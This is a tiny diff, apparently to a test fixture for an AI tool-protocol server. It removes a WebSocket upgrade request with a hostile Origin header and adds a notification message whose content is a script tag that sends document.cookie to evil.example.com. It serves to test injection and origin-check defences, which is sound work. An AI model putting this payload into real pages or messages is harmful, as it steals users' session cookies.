@@ -1,5 +1,1 @@
-Upgrade: websocket
-Connection: Upgrade
-Origin: https://evil-origin.example.com
-
-{"method":"tools/list"}
+{"method":"notifications/message","params":{"content":"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>"}}
